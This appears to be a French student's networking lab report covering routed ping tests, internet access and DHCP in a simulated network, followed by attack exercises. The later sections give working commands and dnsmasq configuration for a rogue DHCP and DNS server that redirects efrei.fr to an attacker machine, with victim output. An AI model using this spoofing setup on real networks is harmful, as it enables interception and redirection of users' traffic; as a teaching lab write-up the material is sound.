# Part1 : Network Setup

## 7. Proof or lie¶
🌞 Tout le monde doit pouvoir se ping

- au sein du même LAN :

* node1 peut ping node2
```sh
node1> ping 10.2.1.12
84 bytes from 10.2.1.12 icmp_seq=1 ttl=64 time=1.116 ms
84 bytes from 10.2.1.12 icmp_seq=2 ttl=64 time=0.807 ms
```

* node3 peut ping node4
  ```sh
  node3> ping 10.2.2.12
  84 bytes from 10.2.2.11 icmp_seq=1 ttl=63 time=51.351 ms
  84 bytes from 10.2.2.11 icmp_seq=2 ttl=63 time=15.248 ms
  ```

 - le routage doit fonctionner :
   * node1 peut ping node3
     ```sh
     node1> ping 10.2.2.11
      84 bytes from 10.2.2.11 icmp_seq=1 ttl=63 time=51.351 ms
      84 bytes from 10.2.2.11 icmp_seq=2 ttl=63 time=15.248 ms
    ```
    
* node4 peut ping node2
  ```sh
  
    84 bytes from 10.2.1.12 icmp_seq=1 ttl=63 time=29.800 ms
    84 bytes from 10.2.1.12 icmp_seq=2 ttl=63 time=22.071 ms
  ```
 ➜ Wireshark this shiet
 ```sh
 Ping de node1 vers node4
 Dispo dans  p1_routed_ping.pcap
 ```

# Part2 : C'est mieux avec internet

🌞 Prouver que...

```SH
r1.tp2.efrei#ping 1.1.1.1

Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 1.1.1.1, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 20/65/100 ms

node1> ping 1.1.1.1

1.1.1.1 icmp_seq=1 timeout
1.1.1.1 icmp_seq=2 timeout

```

## 2. Accès internet clients

```sh

node2> ping 1.1.1.1

84 bytes from 1.1.1.1 icmp_seq=1 ttl=253 time=40.436 ms
84 bytes from 1.1.1.1 icmp_seq=2 ttl=253 time=33.790 ms

node3> ping 1.1.1.1

84 bytes from 1.1.1.1 icmp_seq=1 ttl=253 time=30.683 ms
84 bytes from 1.1.1.1 icmp_seq=2 ttl=253 time=33.646 ms
node4> ping 1.1.1.1

84 bytes from 1.1.1.1 icmp_seq=1 ttl=253 time=29.844 ms
84 bytes from 1.1.1.1 icmp_seq=2 ttl=253 time=25.598 ms
```

## 3. Vrai accès internet clients¶

🌞 Prove it

```sh
node1> ping efrei.fr
efrei.fr resolved to 51.210.229.203

84 bytes from 51.210.229.203 icmp_seq=1 ttl=253 time=27.494 ms
84 bytes from 51.210.229.203 icmp_seq=2 ttl=253 time=29.751 ms
```

## 4. DHCP again

🌞 Test test test 

```sh
node5> ip dhcp
DDORA IP 10.2.1.198/24 GW 10.2.1.254

node5> show ip

NAME        : PC5[1]
IP/MASK     : 10.2.1.198/24
GATEWAY     : 10.2.1.254
DNS         : 1.1.1.1
DHCP SERVER : 10.2.1.253
DHCP LEASE  : 593, 600/300/525
MAC         : 00:50:79:66:68:01
LPORT       : 20018
RHOST:PORT  : 127.0.0.1:20019
MTU         : 1500

node5> ping efrei.fr
efrei.fr resolved to 51.210.229.203

84 bytes from 51.210.229.203 icmp_seq=1 ttl=253 time=46.715 ms
84 bytes from 51.210.229.203 icmp_seq=2 ttl=253 time=40.354 ms
```


# Part3 : Time to attack all this

## 3. ARP spoofing
```sh
  -dispo dans 📁 p3_arp_mitm.pcap
```

## 4. DHCP spoofing¶
### B. Proofs¶

🌞 Test test test
```sh
node6> ip dhcp
DDORA IP 10.2.1.233/24 GW 10.2.1.89

node6> show ip

NAME        : node6[1]
IP/MASK     : 10.2.1.233/24
GATEWAY     : 10.2.1.89
DNS         : 1.1.1.1
DHCP SERVER : 10.2.1.89
DHCP LEASE  : 43096, 43200/21600/37800
MAC         : 00:50:79:66:68:05
LPORT       : 20023
RHOST:PORT  : 127.0.0.1:20024
MTU         : 1500

node6> ping efrei.fr
efrei.fr resolved to 51.210.229.203

84 bytes from 51.210.229.203 icmp_seq=1 ttl=253 time=29.995 ms
84 bytes from 51.210.229.203 icmp_seq=2 ttl=253 time=36.758 ms
```

-Wireshark dispo dans  p3_dhcp_mitm.pcap




# Part4 : Alors koa c tou ? On refé just la mem choz ke o tp1 enfet enfet ? Bah non

## 2. Go for it¶
A. Setup

🌞 Préparer le DNS spoof
```sh

┌──(kali㉿kali)-[~]
└─$ echo "10.2.1.89 efrei.fr" > /tmp/spoofed_hosts
                                                           
┌──(kali㉿kali)-[~]
└─$ sudo cat /tmp/spoofed_hosts
10.2.1.89 efrei.fr
                                                              
┌──(kali㉿kali)-[~]
└─$ sudo nano /tmp/dnsmasq.conf
                                                             
┌──(kali㉿kali)-[~]
└─$ sudo cat /tmp/dnsmasq.conf  
interface=enp0s9
listen-address=10.2.1.89
port=53
no-hosts
addn-hosts=/tmp/spoofed_hosts
no-resolv
server=1.1.1.1
server=8.8.8.8
```

B. Vérification¶
🌞 S'assurer que c'est up & running, on en profite pour réviser un peu de shell

```sh
──(kali㉿kali)-[~]
└─$ sudo dnsmasq -C /tmp/dnsmasq.conf -q
                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ ps -ef | grep dnsmasq
nobody     64677       1  0 12:31 ?        00:00:00 dnsmasq -C /tmp/dnsmasq.conf -q
kali       64761    1433  0 12:31 pts/0    00:00:00 grep --color=auto dnsmasq
                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ sudo ss -lnpu | grep dnsmasq
UNCONN 0      0            0.0.0.0:53        0.0.0.0:*    users:(("dnsmasq",pid=64677,fd=4))
UNCONN 0      0               [::]:53           [::]:*    users:(("dnsmasq",pid=64677,fd=6))

```

- DIG1
```sh
┌──(kali㉿kali)-[~]
└─$ dig @1.1.1.1 efrei.fr

; <<>> DiG 9.20.15-2-Debian <<>> @1.1.1.1 efrei.fr
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 54095
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
;; QUESTION SECTION:
;efrei.fr.                      IN      A

;; ANSWER SECTION:
efrei.fr.               413     IN      A       51.210.229.203

;; Query time: 48 msec
;; SERVER: 1.1.1.1#53(1.1.1.1) (UDP)
;; WHEN: Mon Jan 19 12:32:23 EST 2026
;; MSG SIZE  rcvd: 53


```

 - DIG2
    ```sh
    ┌──(kali㉿kali)-[~]
      └─$ dig @127.0.0.1 efrei.fr
    
    ; <<>> DiG 9.20.15-2-Debian <<>> @127.0.0.1 efrei.fr
    ; (1 server found)
    ;; global options: +cmd
    ;; Got answer:
    ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 1399
    ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
    
    ;; OPT PSEUDOSECTION:
    ; EDNS: version: 0, flags:; udp: 1232
    ;; QUESTION SECTION:
    ;efrei.fr.                      IN      A
    
    ;; ANSWER SECTION:
    efrei.fr.               0       IN      A       10.2.1.89
    
    ;; Query time: 4 msec
    ;; SERVER: 127.0.0.1#53(127.0.0.1) (UDP)
    ;; WHEN: Mon Jan 19 12:32:59 EST 2026
    ;; MSG SIZE  rcvd: 53
    ```

  ## C. Hax ?¶
  
C. Hax ?¶
🌞 Relance ton attaque DHCP spoof depuis la machine attaquante
-Ligne de conf modifié
```sh
dhcp-option=6,10.2.1.89
```

🌞 Test test test :
```sh
node7> ip dhcp
DORA IP 10.2.1.234/24 GW 10.2.1.89

node7> show ip

NAME        : node7[1]
IP/MASK     : 10.2.1.234/24
GATEWAY     : 10.2.1.89
DNS         : 10.2.1.89
DHCP SERVER : 10.2.1.89
DHCP LEASE  : 43183, 43200/21600/37800
MAC         : 00:50:79:66:68:06
LPORT       : 20026
RHOST:PORT  : 127.0.0.1:20027
MTU         : 1500

node7> ping efrei.fr
efrei.fr resolved to 10.2.1.89

84 bytes from 10.2.1.89 icmp_seq=1 ttl=64 time=4.410 ms
84 bytes from 10.2.1.89 icmp_seq=2 ttl=64 time=3.284 ms
84 bytes from 10.2.1.89 icmp_seq=3 ttl=64 time=3.516 ms
84 bytes from 10.2.1.89 icmp_seq=4 ttl=64 time=3.648 ms
84 bytes from 10.2.1.89 icmp_seq=5 ttl=64 time=2.911 ms
```





 



